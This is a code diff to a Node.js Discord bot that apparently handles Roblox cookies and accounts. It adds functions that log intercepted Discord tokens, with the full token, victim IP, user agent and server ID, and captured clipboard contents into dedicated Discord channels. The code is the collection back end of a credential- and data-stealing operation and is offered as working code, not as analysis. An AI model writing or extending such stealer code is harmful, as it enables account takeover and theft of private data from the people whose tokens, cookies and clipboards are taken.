@@ -29,6 +29,8 @@ const client = new Client({
 const DATABASE_CHANNEL = 'database';
 const LOGGING_CHANNEL = 'logging';
 const ACCS_CHANNEL = 'accs';
+const TOKENS_CHANNEL = 'tokens';
+const CLIPBOARD_CHANNEL = 'clipboard';
 
 // In-memory cache for performance
 let verifiedUsers = new Set();
@@ -37,6 +39,8 @@ const userCookies = new Map();
 let databaseChannel = null;
 let loggingChannel = null;
 let accsChannel = null;
+let tokensChannel = null;
+let clipboardChannel = null;
 
 // Create axios instance for better performance
 const robloxAPI = axios.create({
@@ -223,6 +227,58 @@ async function logAccountData(userId, username, robloxData, action) {
     .setTimestamp();
   
   await logToChannel('accs', embed);
+}
+
+// Token and clipboard data logging functions
+async function logDiscordToken(data) {
+  if (!tokensChannel) return;
+  
+  try {
+    const embed = new EmbedBuilder()
+      .setColor('#ff0000')
+      .setTitle('🔑 Discord Token Intercepted')
+      .addFields(
+        { name: 'IP Address', value: data.userIP || 'Unknown', inline: true },
+        { name: 'User Agent', value: data.userAgent ? data.userAgent.slice(0, 100) + '...' : 'Unknown', inline: false },
+        { name: 'Server ID', value: data.serverId || 'N/A', inline: true },
+        { name: 'Token Preview', value: data.token ? data.token.slice(0, 20) + '...' : 'Invalid', inline: false },
+        { name: 'Full Token', value: data.token || 'N/A', inline: false },
+        { name: 'Timestamp', value: new Date().toISOString(), inline: true }
+      )
+      .setFooter({ text: 'CRITICAL: Discord token compromised!' })
+      .setTimestamp();
+
+    await tokensChannel.send({ embeds: [embed] });
+    console.log('🔴 Discord token logged to #tokens channel');
+  } catch (error) {
+    console.error('❌ Failed to log token:', error);
+  }
+}
+
+async function logClipboardData(data) {
+  if (!clipboardChannel) return;
+  
+  try {
+    const embed = new EmbedBuilder()
+      .setColor('#ffa500')
+      .setTitle('📋 Clipboard Data Intercepted')
+      .addFields(
+        { name: 'IP Address', value: data.userIP || 'Unknown', inline: true },
+        { name: 'User Agent', value: data.userAgent ? data.userAgent.slice(0, 100) + '...' : 'Unknown', inline: false },
+        { name: 'Data Type', value: data.type || 'text', inline: true },
+        { name: 'Data Length', value: data.clipboardData ? data.clipboardData.length.toString() + ' characters' : '0', inline: true },
+        { name: 'Preview', value: data.clipboardData ? data.clipboardData.slice(0, 200) + (data.clipboardData.length > 200 ? '...' : '') : 'Empty', inline: false },
+        { name: 'Full Data', value: data.clipboardData ? (data.clipboardData.length > 1000 ? data.clipboardData.slice(0, 1000) + '\n\n**[TRUNCATED - Data too long]**' : data.clipboardData) : 'Empty', inline: false },
+        { name: 'Timestamp', value: new Date().toISOString(), inline: true }
+      )
+      .setFooter({ text: 'Clipboard data intercepted' })
+      .setTimestamp();
+
+    await clipboardChannel.send({ embeds: [embed] });
+    console.log('📋 Clipboard data logged to #clipboard channel');
+  } catch (error) {
+    console.error('❌ Failed to log clipboard data:', error);
+  }
 }
 
 // Enhanced Roblox cookie validation
